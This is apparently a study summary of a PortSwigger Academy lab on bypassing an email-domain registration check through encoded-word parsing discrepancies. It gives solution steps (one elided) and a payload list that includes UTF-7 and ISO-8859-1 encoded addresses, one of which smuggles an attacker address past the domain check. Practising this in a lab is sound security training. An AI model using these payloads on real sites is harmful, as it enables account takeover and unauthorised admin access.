# Lab: Bypassing access controls using email address parsing discrepancies

**Official URL:** https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-bypassing-access-controls-using-email-address-parsing-discrepancies

**Lab idea:** Email validation and downstream email parsing interpret an address differently, creating a mismatch in an access-control decision. This lab practices identifying parser discrepancies and checking that security checks and later processing use consistent interpretations.

## Vulnerability in brief
Business logic vulnerabilities—also called application logic vulnerabilities or logic flaws—are design or implementation defects that make an application behave in ways its rules did not intend. They arise when a system's assumptions about user behavior, application state, or the behavior of another component are wrong, and the server does not safely handle an unusual but valid interaction. Unlike a single technical bug pattern, logic flaws are often specific to an application's workflows and require understanding what those workflows are supposed to do.

## Solution idea
1. Open the lab and click Register .
2. Attempt to register an account with the email foo@exploit-server.net .
3. Notice that the application blocks the request and displays an error message stating that the email domain must be ginandjuice.shop .
4. Try to register an account with the following email: =?iso-8859-1?q?=61=62=63?=foo@ginandjuice.shop .
- …
6. Click My account and log in using the details you registered.
7. Click Admin panel to access the list of users.
8. Delete the carlos user to solve the lab.

## Payloads / key values
- `foo@exploit-server.net`
- `ginandjuice.shop`
- `=?iso-8859-1?q?=61=62=63?=foo@ginandjuice.shop`
- `abcfoo@ginandjuice.shop`
- `=?utf-8?q?=61=62=63?=foo@ginandjuice.shop`
- `=?utf-7?q?&AGEAYgBj-?=foo@ginandjuice.shop`
- `=?utf-7?q?attacker&AEA-[YOUR-EXPLOIT-SERVER_ID]&ACA-?=@ginandjuice.shop`
- `attacker@[YOUR-EXPLOIT-SERVER-ID] ?=@ginandjuice.shop`
- `@ginandjuice.shop`
- `attacker@[YOUR-EXPLOIT-SERVER-ID]`
- `carlos`

## Official source
- [PortSwigger Academy: Lab: Bypassing access controls using email address parsing discrepancies](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-bypassing-access-controls-using-email-address-parsing-discrepancies)
